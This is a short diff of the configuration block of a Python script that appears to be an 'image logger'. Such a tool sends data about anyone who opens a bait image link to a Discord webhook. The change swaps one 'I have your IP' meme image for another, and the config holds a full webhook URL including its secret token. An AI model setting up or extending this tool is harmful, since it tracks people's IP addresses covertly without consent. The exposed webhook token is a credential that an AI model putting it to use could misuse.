@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1431842729062830132/w2LLMlEzZalwA1x2651tH4oPsOSStxq9bz8c8Cq_YfzWiBJLqPVRY0kZAl_QjdMms3KI",
-    "image": "https://media.makeameme.org/created/i-have-your-7ce4486a1c.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://c.tenor.com/QjNaETDi76cAAAAM/ip-i-have-your-ip-address.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
